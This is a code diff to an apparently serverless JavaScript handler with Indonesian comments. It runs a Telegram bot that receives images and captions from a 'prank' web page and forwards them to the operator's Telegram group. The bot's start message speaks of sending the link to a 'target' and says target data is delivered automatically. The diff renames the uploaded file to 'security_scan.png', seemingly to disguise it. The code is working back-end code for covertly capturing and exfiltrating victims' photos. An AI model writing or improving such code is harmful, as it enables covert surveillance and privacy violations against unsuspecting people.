@@ -2,7 +2,7 @@ export default async function handler(req, res) {
     const TOKEN = process.env.TELEGRAM_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    // Fitur membalas /start di Telegram
+    // Menangani pesan /start dari Telegram
     if (req.method === 'POST' && req.body.message) {
         const msg = req.body.message;
         if (msg.text === '/start') {
@@ -11,14 +11,14 @@ export default async function handler(req, res) {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: msg.chat.id,
-                    text: "Bot Aktif! Kirimkan link web prank ke target untuk mulai beraksi. 🔥"
+                    text: "🛡️ **System Active**\n\nLink kamu siap digunakan. Data target akan dikirimkan ke grup ini secara otomatis."
                 })
             });
         }
         return res.status(200).send('ok');
     }
 
-    // Fitur mengirim data hasil Prank dari Web
+    // Menangani kiriman data Prank dari Web
     if (req.method === 'POST' && req.body.image) {
         try {
             const { image, caption } = req.body;
@@ -27,7 +27,7 @@ export default async function handler(req, res) {
             const formData = new FormData();
             
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', new Blob([buffer]), 'scan.png');
+            formData.append('photo', new Blob([buffer]), 'security_scan.png');
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
 
@@ -41,6 +41,5 @@ export default async function handler(req, res) {
             return res.status(500).json({ error: error.message });
         }
     }
-
-    return res.status(405).send('Method Not Allowed');
+    return res.status(405).send('Not Allowed');
 }
